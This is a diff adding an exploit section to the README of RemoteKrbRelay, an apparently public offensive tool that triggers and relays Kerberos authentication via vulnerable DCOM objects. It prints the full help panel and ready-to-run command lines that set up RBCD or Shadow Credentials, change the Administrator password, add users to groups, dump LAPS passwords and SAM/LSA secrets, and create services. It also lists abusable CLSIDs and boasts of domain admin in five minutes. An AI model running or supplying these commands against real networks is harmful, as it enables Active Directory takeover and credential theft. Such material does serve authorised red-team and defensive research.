@@ -109,6 +109,156 @@ The columns will contain the DCOM object CLSIDs, names, and LaunchPermission and
 
 Try searching for sppui (CLSID {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}, APPID {0868DC9B-D9A2-4f64-9362-133CEA201299}) and CertSrv Request (CLSID { d99e6e74-fc88-11d0-b498-00a0c90312f3}) objects and understand why they are vulnerable.
 
+Don't use Checker, use only Checkerv2.0 pls :3 
+
+## Exploit
+I added quite a bit of different functionality to the exploit. Note that it provides enough functionality to abuse DCOM objects. I've also listed a few CLSIDs in Help for abuse. These CLSIDs were publicly known, there just wasn't a POC to abuse them. There are quite a few vulnerable DCOM objects, work with the checker and find them all!
+
+```shell
+PS A:\ssd\Share\RemoteKrbRelay\Exploit\RemoteKrbRelay\bin\x64\Debug> .\RemoteKrbRelay.exe -h
+
+                            /\_/\____,
+                  ,___/\_/\ \  ~     /
+                  \     ~  \ )   XXX
+                    XXX     /    /\_/\___,
+                       \o-o/-o-o/   ~    /
+                        ) /     \    XXX
+                       _|    / \ \_/
+                    ,-/   _  \_/   \
+                   / (   /____,__|  )
+                  (  |_ (    )  \) _|
+                 _/ _)   \   \__/   (_
+                (,-(,(,(,/      \,),),)
+
+                CICADA8 Research Team
+                From Michael Zhmaylo (MzHmO)
+
+[HELP PANEL]
+        RemoteKrbRelay.exe
+        Relaying Remote Kerberos Auth by easy way
+        Usage: RemoteKrbRelay.exe [ATTACKS] [REQUIRED OPTIONS] [OPTIONAL PARAMS] [ATTACK OPTIONS] [SWITCHES]
+
+[ATTACKS] (one required!)
+        -rbcd : relay to LDAP and setup RBCD
+        -adcs : relay to HTTP Web Enrollment and get certificate
+        -smb : relay to SMB
+        -shadowcred : relay to LDAP and setup Shadow Credentials
+        -chp : relay to LDAP and change user password
+        -addgroupmember : relay to LDAP and add user to group
+        -laps : relay to LDAP and extract LAPS passwords
+        -ldapwhoami : relay to LDAP and get info about relayed user
+
+[REQUIRED OPTIONS]
+        -target : relay to this target
+        -victim : relay this computer
+        -clsid : target CLSID to abuse
+
+[OPTIONAL PARAMS]
+        -spn : with ticket on this SPN victim will come to us. For ex: ldap/dc01.root.apchi - tkt for RBCD mode , http/dc01.root.apchi - tkt for ADCS mode
+        -d/--domain : current (target) domain
+        -dc/--domaincontoller : target DC
+        -local : current computer hostname. This host will be in OBJREF.
+
+[ATTACK OPTIONS]
+        [SMB OPTIONS (Relay to SMB)]
+        --smbkeyword : specify 'secrets' or 'service-add' or 'interactive'
+        --servicename : service-add cmdlet. Name of new service
+        --servicecmd : service-add cmdlet. Commandline of the service
+
+        [ADCS OPTIONS (Relay to HTTP)]
+        -template : ADCS Mode only. Template to relay to
+
+        [RBCD OPTIONS (Relay to LDAP)]
+        -c/--create :  Create new computer
+        -cn/--computername :  Computer name that will be written to msDs-AllowedToActOnBehalfOfOtherIdentity
+        -cp/--computerpassword : requires -c switch. Password for new computer
+        --victimdn : DN of victim computer
+
+        [CHANGE PASSWORD OPTIONS (Relay to LDAP)]
+        -chpuser : the name of the user whose password you want to change
+        -chppass : new password
+
+        [ADD GROUP MEMBER OPTIONS (Relay to LDAP)]
+        -group : group name
+        -groupuser : user to add to the group
+        -groupdn : target group DN
+        -userdn : target user DN
+
+        [SHADOWCRED OPTIONS (Relay to LDAP)]
+        -forceshadowcred : force shadow creds
+
+        [LAPS OPTIONS (Relay to LDAP)]
+        -lapsdevice : Optional param. Target computer hostname to dump laps from
+
+[SWITCHES]
+        -h/--help : show help
+        -debug : show debug info
+        -secure : use SSL for connection to LDAP/HTTP/etc
+        -p/--port : port to deploy rogue dcom server
+        -session : cross-session activation. Useful when instantiating com objects with RunAs value as "The Interactive User"
+        -module : default "System". It is for firewall bypass
+
+[EXAMPLES]
+        [1] Trigger kerberos authentication from adcs.root.apchi (-victim). Then relay to dc01.root.apchi (-target). And setup RBCD (u can optionally provide -dc because setuping RBCD requires connection to ldap on DC) from adcs.root.apchi to FAKEMACHINE$ (-cn). As a result u can pwn adcs.root.apchi from FAKEMACHINE$ through RBCD
+        .\RemoteKrbRelay.exe -rbcd -victim adcs.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -cn FAKEMACHINE$
+
+        [2] Trigger krb auth from dc01.root.apchi (-victim). Then relay to win10.root.apchi (-target) and open interactive SMB Console.
+        .\RemoteKrbRelay.exe -smb --smbkeyword interactive -victim dc01.root.apchi -target win10.root.apchi -clsid <IDK CLSID FOR THAT xD>
+
+        [3] Trigger krb auth from dc01.root.apchi (-victim). Then relay to win10.root.apchi (-target) and dump SAM/LSA secrets from win10.root.apchi.
+        .\RemoteKrbRelay.exe -smb --smbkeyword secrets -victim dc01.root.apchi -target win10.root.apchi -clsid <IDK CLSID FOR THAT xD>
+
+        [4] Trigger krb auth from dc01.root.apchi (-victim). Then relay to win10.root.apchi (-target) and create service.
+        .\RemoteKrbRelay.exe -smb --smbkeyword service-add --servicename Hello --servicecmd "c:\windows\system32\calc.exe" -victim dc01.root.apchi -target win10.root.apchi -clsid <IDK CLSID FOR THAT xD>
+
+        [5] Get machine certificate from kerberos relay
+        .\RemoteKrbRelay.exe -adcs -template Machine -target dc01.root.apchi -victim win10.root.apchi -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
+
+        [6] Shadow Creds
+        .\RemoteKrbRelay.exe -shadowcred -victim dc01.root.apchi -target dc01.root.apchi -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -forceshadowcred
+
+        [7] Change user password
+        .\RemoteKrbRelay.exe -chp -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -chpuser Administrator -chppass Lolkekcheb123! -secure
+
+        [9] Dump LAPS passwords
+        .\RemoteKrbRelay.exe -laps -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83
+
+        [10] Send LDAP Whoami request from relayed user
+        .\RemoteKrbRelay.exe -ldapwhoami -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83
+
+        [11] Trigger authentication from another session
+        .\RemoteKrbRelay.exe -ldapwhoami -victim dc01.root.apchi -target dc01.root.apchi -clsid f87b28f1-da9a-4f35-8ec0-800efcf26b83 -session 1
+
+[?] Interesting CLSIDs to use
+dea794e0-1c1d-4363-b171-98d0b1703586 - Interactive User. U can use with -session switch. U should be in NT AUTHORITY\Interactive
+f87b28f1-da9a-4f35-8ec0-800efcf26b83 - Interactive User. U can use with -session switch. U should be in Distributed COM Users or Performance Log Users
+3ab092c4-de6a-4cd4-be9e-fdacdb05759c - System account. On victim computer should be installed AD CS
+6d5ad135-1730-4f19-a4eb-3f87e7c976bb - System account. On victim computer should be installed AD CS
+```
+
+# Examples
+I suggest looking at some of the attacks:
+- RBCD - relay to LDAP and setup RBCD.
+![Pasted image 20240520155730](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/b0c45ea0-92ff-4f8c-9984-0ca15e629aee)
+
+- HTTP ADCS - relay to web enrollment service.
+![Pasted image 20240520155547](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/ca34a642-57b6-482f-9965-acd22056ab4f)
+
+- ShadowCred - relay to LDAP and setup ShadowCreds.
+![Pasted image 20240529141710](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/f7811781-9e5e-4a74-ae19-33c9353fae9d)
+
+- Add user to group
+![Pasted image 20240529170057](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/fe401965-fc89-44e1-ba74-cc1529902e63)
+
+- LDAP Whoami request - It is convenient to combine with CLSID Bruteforce functionality. You can find out which user you are triggering. Try triggering for the first five sessions on all machines in the domain. Wow, that's what, a domain administrator in five minutes? :) 
+![Pasted image 20240530214447](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/8274b454-2e6a-4530-b963-2b96191eb3a2)
+
+Supports cross-session activation using `-session`:
+![Pasted image 20240530220634](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/13b7adc3-5597-42c8-8388-b6f2f4bcc9d3)
+
+![Pasted image 20240530220705](https://github.com/CICADA8-Research/RemoteKrbRelay/assets/92790655/54dfd18e-b99f-450e-998d-91aefdd2cbda)
+
+Also LAPS, changing user password, smb....
 
 # TO DO LIST
 - [ ] Dump GMSA
